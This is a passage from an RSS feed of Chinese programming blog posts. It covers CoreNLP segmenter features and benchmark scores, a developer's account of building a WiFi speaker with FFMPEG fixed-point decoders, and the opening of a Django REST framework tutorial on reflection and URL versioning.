        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charc2 +charc  +&lt;span class=&quot;st&quot;&gt;&quot;::n2c&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[1]c[0]&lt;/span&gt;
    }

    &lt;span class=&quot;co&quot;&gt;// 三个字符c[-1]c[0]c[1]对应的LBeginAnnotation、LMiddleAnnotation、LEndAnnotation 三种label特征&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;// 结果特征分别以6种形式结尾，&quot;-lb&quot;, &quot;-lm&quot;, &quot;-le&quot;, &quot;-plb&quot;, &quot;-plm&quot;, &quot;-ple&quot;, &quot;-c2lb&quot;, &quot;-c2lm&quot;, &quot;-c2le&quot;&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;// null || &quot;.../models/segmenter/chinese/dict-chris6.ser.gz&quot;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;dictionary&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; || flags.&lt;span class=&quot;fu&quot;&gt;serializedDictionary&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;) {
        &lt;span class=&quot;fu&quot;&gt;dictionaryFeaturesC&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;LBeginAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;,
                CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;LMiddleAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;,
                CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;LEndAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;,
                &lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;, features, p, c, c2);
    }

    &lt;span class=&quot;co&quot;&gt;// 特征 c[1]c[0], c[1]&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useFeaturesC4gram&lt;/span&gt; || flags.&lt;span class=&quot;fu&quot;&gt;useFeaturesC5gram&lt;/span&gt; || flags.&lt;span class=&quot;fu&quot;&gt;useFeaturesC6gram&lt;/span&gt;) {
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp2 + charp + &lt;span class=&quot;st&quot;&gt;&quot;p2p&quot;&lt;/span&gt;);
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp2 + &lt;span class=&quot;st&quot;&gt;&quot;p2&quot;&lt;/span&gt;);
    }

    &lt;span class=&quot;co&quot;&gt;// Unicode特征&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useUnicodeType&lt;/span&gt; || flags.&lt;span class=&quot;fu&quot;&gt;useUnicodeType4gram&lt;/span&gt; || flags.&lt;span class=&quot;fu&quot;&gt;useUnicodeType5gram&lt;/span&gt;) {
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(uTypep + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt; + uTypec + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt; + uTypec2 + &lt;span class=&quot;st&quot;&gt;&quot;-uType3&quot;&lt;/span&gt;);
    }

    &lt;span class=&quot;co&quot;&gt;// UnicodeType特征&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useUnicodeType4gram&lt;/span&gt; || flags.&lt;span class=&quot;fu&quot;&gt;useUnicodeType5gram&lt;/span&gt;) {
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(uTypep2 + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt; + uTypep + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt; + uTypec + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt; + uTypec2 + &lt;span class=&quot;st&quot;&gt;&quot;-uType4&quot;&lt;/span&gt;);
    }

    &lt;span class=&quot;co&quot;&gt;// UnicodeBlock特征&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useUnicodeBlock&lt;/span&gt;) {
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(p.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;UBlockAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;) + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt;
                + c.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;UBlockAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;) + &lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt;
                + c2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;UBlockAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                + &lt;span class=&quot;st&quot;&gt;&quot;-uBlock&quot;&lt;/span&gt;);
    }

    &lt;span class=&quot;co&quot;&gt;// Shape特征&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useShapeStrings&lt;/span&gt;) {
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useShapeStrings1&lt;/span&gt;) {
            features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(p.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;) + &lt;span class=&quot;st&quot;&gt;&quot;ps&quot;&lt;/span&gt;);
            features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(c.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;) + &lt;span class=&quot;st&quot;&gt;&quot;cs&quot;&lt;/span&gt;);
            features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(c2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;) + &lt;span class=&quot;st&quot;&gt;&quot;c2s&quot;&lt;/span&gt;);
        }
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useShapeStrings3&lt;/span&gt;) {
            features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(p.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + &lt;span class=&quot;st&quot;&gt;&quot;pscsc2s&quot;&lt;/span&gt;);
        }
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useShapeStrings4&lt;/span&gt;) {
            features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(p2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + p.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + &lt;span class=&quot;st&quot;&gt;&quot;p2spscsc2s&quot;&lt;/span&gt;);
        }
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useShapeStrings5&lt;/span&gt;) {
            features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(p2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + p.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c2.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + c3.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;(CoreAnnotations.&lt;span class=&quot;fu&quot;&gt;ShapeAnnotation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;)
                    + &lt;span class=&quot;st&quot;&gt;&quot;p2spscsc2sc3s&quot;&lt;/span&gt;);
        }
    }
}

Gale2007ChineseSegmenterFeatureFactory::&lt;span class=&quot;fu&quot;&gt;featuresCpC&lt;/span&gt;() {}

Gale2007ChineseSegmenterFeatureFactory::&lt;span class=&quot;fu&quot;&gt;featuresCnC&lt;/span&gt;() {}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;三大类特征分别以“|C”为结尾（共计有32个）、以“|CpC”结尾（共计有37个）、以“|CnC”结尾（共计有9个）；总计78个特征。个人感觉CoreNLP定义的特征过于复杂，大部分特征并没有什么用。&lt;/p&gt;
&lt;p&gt;CoreNLP后面处理流程跟其他分词器别无二样了，求每个label的权重加权之和，Viterbi解码求解最大概率路径，解析label序列得到分词结果。CoreNLP分词速度巨慢，效果也一般，在PKU、MSR测试集上的表现如下：&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td align=&quot;center&quot;&gt;PKU&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;thulac4j&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.948&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.936&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;0.942&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td align=&quot;center&quot;/&gt;
&lt;td align=&quot;center&quot;&gt;CoreNLP&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.901&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.894&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.897&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td align=&quot;center&quot;&gt;MSR&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;thulac4j&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.866&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.896&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;strong&gt;0.881&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td align=&quot;center&quot;/&gt;
&lt;td align=&quot;center&quot;&gt;CoreNLP&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.822&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.859&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.840&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;[1] Huihsin, Tseng, et al. &quot;A conditional random field word segmenter.&quot; Fourth SIGHAN Workshop. 2005.&lt;br/&gt;[2] Chang, Pi-Chuan, Michel Galley, and Christopher D. Manning. &quot;Optimizing Chinese word segmentation for machine translation performance.&quot; Proceedings of the third workshop on statistical machine translation. Association for Computational Linguistics, 2008.&lt;/p&gt;
</description>
<pubDate>Wed, 07 Feb 2018 13:24:00 +0000</pubDate>
<dc:creator>Treant</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/en-heng/p/8428504.html</dc:identifier>
</item>
<item>
<title>记开发过的一款无线音箱解决方案 - davidtym</title>
<link>http://www.cnblogs.com/talkaudiodev/p/8428434.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/talkaudiodev/p/8428434.html</guid>
<description>&lt;p&gt;从2017年开始国外智能音箱的热潮席卷到国内，各大小厂商都推出了智能音箱，主要有阿里的天猫精灵京东的叮咚和小米的小爱同学等。我也在去年双11入手了一款智能音箱（天猫精灵），体验下来总体感觉还是不错的，我相信这股热潮在今年（2018）会愈演愈热。有报道说美国的青年有了智能音箱后对手机的依赖度有所下降，即有些事情可以通过智能音箱解决了，这种现象在国内也会出现。智能音箱是在无线音箱的基础上加上人工智能（AI）发展起来的。几年前无线音箱也火过，推出了好多产品，有基于bluetooth的，也有基于WiFi的。基于bluetooth的是主流，基于WiFi的不多，但是现在智能音箱都是基于WiFi的。那时我还在芯片公司，我们team的语音解决方案已经做得很成熟，老板就让我们用自己公司的芯片做主芯片，开发一个基于WiFi的无线音箱解决方案。&lt;/p&gt;

&lt;p&gt;无线音箱先由手机去配置连到某个无线路由器上，手机也连到这个无线路由器上， 这样手机上的音乐播放器就可以把音乐在无线音箱上播放了。既可以把手机本机上的歌曲推送到音箱上播放，也可以把云端的歌曲推送到音箱上播放。支持的协议有DLNA和Airplay，主流的音乐播放器（QQ音乐/酷狗音乐/网易云音乐等）均支持，也支持苹果的音乐播放器（Airplay）。支持的音乐格式很多，有MP3/AAC/OGG/APE/WMA/ALAC/FLAC等，支持音乐双声道立体声播放，但是在一个音箱上效果不明显。如果有两个这样的音箱，又用上公司开发的相应的音乐播放APP，可以把左声道的数据推送到一个音箱上，右声道的数据推送到另一个音箱上，产生较强的立体声效果。&lt;/p&gt;

&lt;p&gt;无线音箱的软件实现是在openWrt上开发的，这样无线相关的软件全都好了，我们只要开发音频相关的软件。音频相关的绝大多数是基于开源的开发，协议的DLNA用的是sharepoint，AirPlay用的是gmediarender，音乐格式解析及解码等用的是FFMPEG，音频的播放用的是ALSA。Sharepoint和gmediarender基本上是拿来用，在接口上改了一点点，调用我们做好的API实现与我们自己软件的通信。FFMPEG主要是增加decoder，同时还要对decoder优化使其能流畅的运行。我们自己的软件就是搭一个框架（实现一个process）把这些开源实现给串起来，形成一个无线音箱音乐播放方案。解决方案的软件框图如下：&lt;/p&gt;
&lt;p&gt;                                        &lt;img src=&quot;https://images2017.cnblogs.com/blog/1181527/201802/1181527-20180207204124670-796959395.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;我们实现的process叫mediaplay, 它与协议（DLNA/AirPlay）之间通过share memory通信，从而实现音乐的播放暂停停止等。Mediaplay会调用FFMPEG提供的API去解析音乐格式，并一帧一帧的解码得到PCM数据放进ring buffer中，然后用mutex block住mediaplay。Mediaplay向ALSA注册了回调函数，每隔一帧时长就会被调用一次，取走ring buffer中一帧PCM数据，并解锁mutex使mediaplay继续循环运行去解码下一帧。在一首歌开始解码时一般会缓存若干帧在ring buffer中然后才使能播放，这样做虽然增加了一两百毫秒的delay，但是保证了播放时的连续流畅性，不会出现噪声。再说音乐播放是非实时业务，一两百毫秒的delay对用户是不敏感的。&lt;/p&gt;

&lt;p&gt;我们team共4人。一人负责ALSA（包括driver和ALSA-Lib的调用），一人负责软件框架（即实现mediaplay process及里面的控制逻辑）,一人负责DLNA/AirPlay协议的移植以及与mediaplay的通信，我负责FFMPEG、decoder优化以及把优化好的decoder lib集成到FFMPEG中，同时还负责后处理（主要是EQ）。用开源的好处是网上资料很多。我开始前先在网上搜怎么编译FFMPEG生成动态库，以及怎么使能一些decoder不使能一些decoder等。这些搞定后就调研我们需要的decoder（MP3/AAC/APE/OGG/WMA/FLAC/ALAC）FFMPEG是否都支持，哪些是定点实现的，哪些是浮点实现的（我们是在ARM上做软件方案，且CPU只有500兆，一定要用定点实现，浮点实现CPU load扛不住）。调研下来这些decoder FFMPEG都支持，但是AAC/OGG/WMA是浮点实现的。做了个小应用程序（代码中调用FFMPEG的API）在芯片上去播放这些格式的音乐，明显播放速度变慢了，这就需要去找这些decoder的定点实现来替换浮点实现。又到网上搜这些decoder定点实现中哪个应用最广泛（在网上快速搜到自己想要的东西也是一种能力，我就在那时候这方面的能力得到了提高，并且养成了要找开源首先去GitHub的习惯。给GitHub打广告了，哈哈）。&lt;/p&gt;

&lt;p&gt;对于AAC，搜下来定点方案中较好的是3GPP中AAC的参考实现。由于是3GPP的reference code，质量肯定没问题，就决定用它了。刚开始未优化时在我们芯片上跑下来load是2000多MCPS，后来一步步优化到不到200MCPS，可以在芯片上高枕无忧的运行了，也就没再继续优化，还要去忙其他的decoder呢。至于怎么优化的可以看我前面写过的一片文章（&lt;a href=&quot;http://www.cnblogs.com/talkaudiodev/p/7502193.html&quot;&gt;音频的编解码及其优化方法和经验&lt;/a&gt;），这里就不具体描述了，通常优化都是有套路的。优化好后就要把静态库集成到FFMPEG中，并且加相应的适配代码，使其能正常运行。那时（2013年）网上关于这方面的描述不多，我也是一边搜索一边尝试，最终把AAC的定点实现库成功集成到FFMPEG中了。这里也简单说一下怎么加decoder的库到FFMPEG 中，给有需要的做个参考。主要有以下几个步骤：&lt;/p&gt;
&lt;p&gt;1）把decoder调好，得到库文件和头文件&lt;/p&gt;
&lt;p&gt;2）修改FFMPEG的configure&lt;/p&gt;
&lt;p&gt;3）在allcodecs.c中加上REGISTER_DECODER()，注册这个decoder&lt;/p&gt;
&lt;p&gt;4）在libavcodec目录中加上这个decoder的适配文件（*.c），同时修改libavcodec下的makefile，使这个适配文件能编进去&lt;/p&gt;
&lt;p&gt;5）修改./configure 使这个decoder使能，同时告诉相应的库路径和头文件路径&lt;/p&gt;

&lt;p&gt;OGG格式的解码用的是Vorbis，其官网（www.xiph.org）上就有定点实现。本来load就不高，把他简单优化一下就可以用了，然后做成静态库集成到FFMPEG中。从找定点实现到集成到FFMPEG中用了不到一星期时间，可以说是非常顺利。WMA就没有这么顺利了，废了一番波折，主要是因为微软不提供定点实现。在网上花了一些时间搜索，某个国外论坛里有人说RockBox里有WMA的定点实现。把RockBox download下来在Ubuntu下生成一个带界面的应用程序，播放一个WMA格式的音乐，可以正常播放。接下来就是把WMA的定点实现从RockBox中剥离出来，它与其他代码耦合的比较深，剥离花了些时间，最终还是成功剥离了，又花了点时间简单优化下并做成库集成进FFMPEG中。这样三个decoder的优化及集成就搞定了。&lt;/p&gt;

&lt;p&gt;Decoder搞定后就开始做后处理，主要做均衡化（EQ），它是通过改变不同频段上的gain值从而产生不同的音效，有摇滚、经典、古典、爵士舞曲等10种模式。从信号处理的角度看，EQ就是一个两阶IIR滤波器。用户在手机APP上指定想要的模式后模式ID就会发到音箱上，软件就会根据ID得到相应的参数做EQ后处理。依旧在网上找定点实现，找到后先做一个应用程序验证效果。验证好后就开始把它用到我们的产品中并和其他模块联调。调试好后看到我们的无线音箱也支持音效特别有成就感。&lt;/p&gt;

&lt;p&gt;经过我们几个月的努力，无线音箱解决方案完成了，也陆续得到客户的认可，采用我们的方案。对我个人而言，从语音扩展到了音乐，音频的知识面更广了。&lt;/p&gt;
</description>
<pubDate>Wed, 07 Feb 2018 12:58:00 +0000</pubDate>
<dc:creator>davidtym</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/talkaudiodev/p/8428434.html</dc:identifier>
</item>
<item>
<title>Python之Django rest_Framework(2) - 孟庆健</title>
<link>http://www.cnblogs.com/mengqingjian/p/8428053.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mengqingjian/p/8428053.html</guid>
<description>&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;实例化：
v1 &lt;/span&gt;= [&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;view.xxx.path.Role&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;view.xxx.path.Group&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,]    可以循环，循环出来的每一个不能实例化
如果把v1循环弄成每一个对象列表，通过rsplit切割，在通过importlib.import_module拿到每一个路径，在通过getattr把它的类名拿过来，&lt;br/&gt;这个类加括号就是实例化想
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; item &lt;span&gt;in&lt;/span&gt;&lt;span&gt; v1:
m &lt;/span&gt;= importlib.import_module(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;view.xxx.path&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
cls &lt;/span&gt;= getattr(m,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Role&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
cls()



&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; view.xxx.path &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Role,Group      
v2 &lt;/span&gt;=&lt;span&gt; [Group,Role]      这个可以循环每一个实例化
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; item &lt;span&gt;in&lt;/span&gt; v2:     &lt;span&gt;#&lt;/span&gt;&lt;span&gt;循环V2的每一个元素加括号，就是实例化&lt;/span&gt;
item()&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;rest_Framework的规范：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;    按顺序：它的method的不同，原来没有考虑，原来是url区分，现在通过method来区分，method的不同提交方式不同，紧接着一般是面向资源的就是把url变成名词，接下就是返回值，以前没有考虑状态码，现在有考虑状态码。（一般有get，post方法，还有put,delete等方法）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;一、Django rest_Framework框架&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;   ----为什么用Django rest_Framework框架？&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;            ----首先没有&lt;/strong&gt;Django rest_Framework框架用django也是可以做出来的，只不过它为我们提供一些API常用的功能，比如：（认证，权限，限流，有了这些我们只需要写个类已配置，它就能当都市图用，还能全局配置，如果自己写还得写中间件，写装饰器来实现，通过&lt;strong&gt;&lt;strong&gt;Django rest_Framework框架，他已经把规则写好，只需要写类，只需实现方法，返回值就可以&lt;/strong&gt;&lt;/strong&gt;）&lt;/span&gt;实现了一部分功能。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;  ----设计比较好&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;            ----单独视图+全局配置 =&amp;gt;Dajngo中间件（importlib/反射）=&amp;gt;动态配置课扩展（短信，邮件，微信等提醒）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、Django rest_Framework原理？&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;        先开始在路由，路由.as_view：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1197755/201802/1197755-20180207154604685-441773544.png&quot; alt=&quot;&quot; width=&quot;403&quot; height=&quot;325&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;点击as_view&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;   &lt;img src=&quot;http://images2017.cnblogs.com/blog/1197755/201802/1197755-20180207155715013-230538091.png&quot; alt=&quot;&quot; width=&quot;356&quot; height=&quot;297&quot;/&gt;        &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1197755/201802/1197755-20180207155829716-1635047046.png&quot; alt=&quot;&quot; width=&quot;341&quot; height=&quot;251&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;请求进来，走完以上，才走self.dispatch()&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;走&lt;/strong&gt;self.dispatch()&lt;/span&gt;流程如下地址：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: Python之Django rest_Framework框架认证源码分析&quot; href=&quot;http://www.cnblogs.com/mengqingjian/p/8419563.html&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/mengqingjian/p/8419563.html&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;三、版本&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;a.根据url的不同来来操作，版本控制&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;先在setting中注册&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36.5&quot;&gt;&lt;img id=&quot;code_img_closed_8413af73-dc75-4f0c-a8fe-fd0e9d077114&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_8413af73-dc75-4f0c-a8fe-fd0e9d077114&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_8413af73-dc75-4f0c-a8fe-fd0e9d077114&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url,include
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; django.contrib &lt;span&gt;import&lt;/span&gt;&lt;span&gt; admin

urlpatterns &lt;/span&gt;=&lt;span&gt; [
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;url(r'^admin/', admin.site.urls),&lt;/span&gt;
    url(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^api/(?P&amp;lt;version&amp;gt;[v1|v2]+)/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, include(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;api.urls&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)),
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; url(r'^api/', include('api.urls')),&lt;/span&gt;
    url(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^backend/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, include(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;backend.urls&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)),
]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;url&lt;/span&gt;&lt;/div&gt;

